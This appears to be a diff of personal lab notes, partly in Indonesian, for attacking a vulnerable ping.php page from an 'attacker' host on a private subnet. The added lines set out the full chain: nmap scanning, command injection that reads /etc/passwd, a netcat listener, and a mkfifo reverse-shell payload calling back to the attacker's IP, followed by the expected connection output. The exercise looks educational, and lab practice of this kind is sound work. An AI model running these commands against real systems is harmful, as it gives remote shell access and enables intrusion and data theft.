@@ -56,6 +56,10 @@ sudo systemctl status amazon-ssm-agent
 
 
 =============== PENYERANG : 10.0.1.175 ==========================================================
+hostname -I
+ip a
+curl ifconfig.me
+
 sudo apt update && sudo apt install nmap -y
 nmap -sn IP-DEBIAN-TARGET
 nmap -sV IP-DEBIAN-TARGET
@@ -66,6 +70,20 @@ ping -c 3 10.0.1.23
 nmap -sV 10.0.1.23
 curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1"
 curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;whoami"
+curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;cat+/etc/passwd"
+
+nc -lvnp 4444
+# Tes 1: Cek apakah ping.php bisa dijangkau
+curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1"
+
+# Tes 2: Cek apakah Command Injection berjalan (Tes sederhana)
+curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;whoami"
+
+curl "http://10.0.1.23/ping.php?ip=127.0.0.1;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2%261|nc+10.0.1.175+4444+>/tmp/f"
+
+
+ouput nya harus nya : 
+Connection received on 10.0.1.23 41650
 
 ====================TARGET : 10.0.1.23 ==================================================
 # 1. Update repositori sistem
